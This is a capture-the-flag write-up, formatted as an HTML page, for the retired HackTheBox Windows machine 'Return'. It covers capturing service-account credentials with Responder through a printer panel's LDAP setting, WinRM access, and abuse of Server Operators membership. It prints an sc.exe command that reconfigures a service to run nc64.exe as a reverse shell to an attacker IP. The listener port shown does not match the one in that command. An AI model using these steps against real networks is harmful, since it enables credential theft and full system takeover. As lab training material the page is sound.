@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Return &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Return</h1>
+    <div class="meta">Target: <code>10.10.14.70</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">ActiveDirectory</span><span class="tag">Responder</span><span class="tag">LDAP</span><span class="tag">WinRM</span><span class="tag">ServiceAccounts</span><span class="tag">ServerOperators</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#web-enumeration">Web Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#credential-capture-via-responder">Credential Capture via Responder</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#server-operators-service-hijack">Server Operators → Service Hijack</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Return is an easy Windows Active Directory box themed around a printer admin panel. The printer's settings page makes an outbound LDAP connection to whatever server address you configure, which means pointing it at a Responder listener hands over cleartext credentials for a service account. That account is a member of the Server Operators group, a privilege that lets members reconfigure Windows services and abuse them for SYSTEM-level code execution.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<p>The scan fingerprints a Domain Controller: DNS on 53, Kerberos on 88, LDAP on 389 and 3268, and HTTP on 80. The HTTP title gives the theme away immediately.</p>
+<pre><code class="language-sh">PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: HTB Printer Admin Panel
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local)
+445/tcp  open  microsoft-ds?
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local)
+Service Info: Host: PRINTER; OS: Windows
+</code></pre>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>Port 80 hosts a printer administration panel. The settings page has an editable "Server Address" field that the printer uses to authenticate outbound LDAP connections. This is the attack surface.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="credential-capture-via-responder">Credential Capture via Responder</h3>
+<p>Start Responder on the attacking interface, then set the Server Address field to the attacking IP and submit:</p>
+<pre><code class="language-sh">sudo responder -I tun0
+</code></pre>
+<p>Responder receives the printer's LDAP authentication attempt in cleartext:</p>
+<pre><code class="language-sh">[LDAP] Cleartext Client   : 10.129.41.143
+[LDAP] Cleartext Username : return\svc-printer
+[LDAP] Cleartext Password : ‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>Why this works:</strong> many printers and network appliances perform LDAP authentication by binding to a server with plain credentials (LDAP simple bind). When the "server" is Responder, it terminates the connection before any encryption is negotiated, receiving the credentials in the clear. The device is designed to make this connection, so no exploit is needed, just misdirection.</p>
+</blockquote>
+<p>nxc confirms the account has WinRM access:</p>
+<pre><code class="language-sh">nxc winrm 10.129.41.143 -u svc-printer -p '‹redacted›'
+WINRM  10.129.41.143  5985  PRINTER  [+] return.local\svc-printer:‹redacted› (Pwn3d!)
+</code></pre>
+<pre><code class="language-sh">evil-winrm -i 10.129.41.143 -u svc-printer -p '‹redacted›'
+</code></pre>
+<p>User flag obtained from <code>C:\Users\svc-printer\desktop\user.txt</code>.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="server-operators-service-hijack">Server Operators → Service Hijack</h3>
+<p><code>svc-printer</code> is a member of the <strong>Server Operators</strong> group. Members of this group can configure any Windows service, including its binary path, without needing local admin rights.</p>
+<blockquote>
+<p><strong>Why Server Operators is dangerous:</strong> the group was intended to let helpdesk staff start and stop services. The ability to change a service's <code>binpath</code> means you can redirect any service to an arbitrary executable. Since services run as SYSTEM by default, this is a direct path to privilege escalation.</p>
+</blockquote>
+<p>The account doesn't have access to <code>sc.exe</code> via the normal path, but calling it directly works. The Volume Shadow Copy service (<code>VSS</code>) is a reliable target:</p>
+<pre><code class="language-powershell">sc.exe config VSS binpath=&quot;C:\Users\svc-printer\Documents\nc64.exe -e cmd 10.10.14.70 443&quot;
+[SC] ChangeServiceConfig SUCCESS
+</code></pre>
+<p>Start the service and catch the callback:</p>
+<pre><code class="language-powershell">sc.exe start VSS
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 8080
+connect to [10.10.14.70] from (UNKNOWN) [10.129.41.143] 52471
+
+C:\Windows\system32&gt;whoami
+nt authority\system
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">C:\Users\Administrator\Desktop&gt;type root.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Printer and appliance admin panels are credential sources.</strong> Any device that makes authenticated outbound connections to a configurable server address will hand creds to Responder.</li>
+<li><strong>LDAP simple bind sends credentials in plaintext.</strong> No hash to crack, the password arrives directly.</li>
+<li><strong>Server Operators is a path to SYSTEM.</strong> Service <code>binpath</code> modification requires no additional tooling, just <code>sc.exe</code> and a listener.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
